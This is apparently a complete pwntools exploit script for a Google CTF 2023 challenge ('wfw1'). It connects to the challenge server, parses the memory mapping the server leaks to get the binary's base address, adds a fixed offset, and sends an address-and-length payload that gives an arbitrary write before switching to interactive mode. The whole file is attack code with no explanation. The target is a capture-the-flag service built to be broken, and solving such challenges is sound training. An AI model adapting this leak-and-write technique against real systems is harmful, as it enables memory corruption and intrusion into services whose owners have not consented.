from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('./chal')

p = remote('wfw1.2023.ctfcompetition.com', '1337')

p.recvuntil(b"I'll give you my mappings so that you'll have a shot.\n")
start_addr = int(p.recvuntil(b'\n').decode().split('-')[0], base=16)

target_addr = start_addr + 0x21e0

payload = hex(target_addr).encode() + b' ' + b'70'
p.sendlineafter(b'Send me nothing and I will happily expire\n', payload)

p.interactive()

